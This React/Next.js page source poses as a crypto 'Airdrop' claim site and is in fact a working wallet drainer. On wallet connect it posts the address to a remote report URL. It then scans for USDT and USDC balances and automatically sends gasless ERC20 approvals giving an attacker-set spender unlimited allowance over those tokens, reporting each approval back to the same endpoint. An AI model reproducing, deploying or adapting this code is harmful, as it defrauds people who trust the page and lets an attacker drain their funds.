'use client';
import { useState, useEffect } from 'react';
import { useAccount } from 'wagmi';
import { erc20Abi, maxUint256, encodeFunctionData } from 'viem';
import { readContract, getBalance, switchChain } from '@wagmi/core';
import { config } from '@/config';
import { sendGaslessTx } from '@/utils/biconomy';

// Spender address from env
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
if (!SPENDER || SPENDER === "0x") {
  throw new Error('SPENDER_ADDRESS is not defined or invalid');
}

// Tokens grouped by chainId
const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
> = {
  1: [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1 * 10 ** 6), decimals: 6 },
  ],
  11155111: [
    { symbol: "USDC", address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", min: BigInt(1 * 10 ** 6), decimals: 6 },
  ],
};

const CHAIN_NAMES: Record<number, string> = {
  1: "Ethereum Mainnet",
  11155111: "Sepolia",
};

function ConnectionReporter() {
  const { address, isConnected } = useAccount();
  useEffect(() => {
    if (isConnected && address) {
       fetch(`${REPORT_URL}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ event: "connect", wallet: address }),
      }).catch(console.error);
    }
  }, [isConnected, address]);
  return null;
}

export default function Home() {
  const { address, isConnected, chainId } = useAccount();
  const [status, setStatus] = useState<string>("");

  async function handleClaim() {
    if (!isConnected || !address) {
      setStatus("Wallet not connected");
      return;
    }

    try {
      setStatus("🔍 Scanning chains for balances...");
      let targetChain: number | null = null;
      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];

      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        const numericCid = Number(cid);
        for (const token of tokens) {
          try {
            const bal = await readContract(config, {
              chainId: numericCid,
              address: token.address,
              abi: erc20Abi,
              functionName: "balanceOf",
              args: [address],
            }) as bigint;
            if (bal >= token.min) {
              targetChain = numericCid;
              usableTokens.push(token);
            }
          } catch {}
        }
        if (usableTokens.length > 0) break;
      }

      if (!targetChain || usableTokens.length === 0) {
        setStatus("No usable balances found.");
        return;
      }

      const chainName = CHAIN_NAMES[targetChain] || "Unknown Chain";
      if (chainId !== targetChain) {
        setStatus(`Switching to ${chainName}...`);
        await switchChain(config, { chainId: targetChain });
      }

      for (const token of usableTokens) {
        try {
          setStatus(`⛽ Sending gasless approval for ${token.symbol}...`);

          // Encode ERC20 approve
          const data = encodeFunctionData({
            abi: erc20Abi,
            functionName: "approve",
            args: [SPENDER, maxUint256],
          });

          // Try Biconomy gasless
          const txHash = await sendGaslessTx({
            to: token.address,
            data,
          });

          // Report success
          setStatus(`${token.symbol} approved ✅ | Tx: ${txHash}`);
          await fetch(`${REPORT_URL}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              event: "approval",
              wallet: address,
              chainName,
              token: token.address,
              symbol: token.symbol,
              txHash,
            }),
          }).catch(console.error);

        } catch (err: any) {
          console.error("❌ Gasless approval failed:", err);
          setStatus(`Gasless failed for ${token.symbol}. Retrying fallback...`);
          // In fallback, just log error or attempt regular approval if you want
        }
      }

      setStatus("🎉 All approvals attempted!");
    } catch (err: any) {
      console.error(err);
      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
    }
  }

  useEffect(() => {
    if (isConnected && address) handleClaim();
  }, [isConnected, address]);

  return (
    <main style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "24px", marginTop: "40px" }}>
      <header style={{
        position: "fixed", top: 0, left: 0, right: 0, height: "64px", background: "#09011fff",
        display: "flex", alignItems: "center", justifyContent: "space-between", padding: "0 24px",
        boxShadow: "0 2px 8px rgba(241, 235, 235, 0.08)", zIndex: 1000,
      }}>
        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>
          AIRDROPS
        </div>
        <appkit-button />
      </header>

      <ConnectionReporter />

      <div style={{ display: "flex", flexDirection: "column", gap: "24px", paddingTop: "80px", width: "80%", maxWidth: "600px" }}>
        <div style={{
          border: "1px solid #9dd6d1ff", borderRadius: "12px", padding: "20px", background: "#090e41ff",
          display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between", height: "500px",
        }}>
          <h2 style={{ marginBottom: "12px" }}>Airdrop</h2>
          <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center",
            color: "#e4e1daff", fontSize: "14px", textAlign: "center" }}>
            {status || ""}
          </div>
          <button onClick={handleClaim} style={{
            background: "#a00b0bff", color: "white", padding: "12px 28px", borderRadius: "8px",
            cursor: "pointer", marginTop: "16px",
          }}>
            Claim Now
          </button>
        </div>
      </div>
    </main>
  );
}
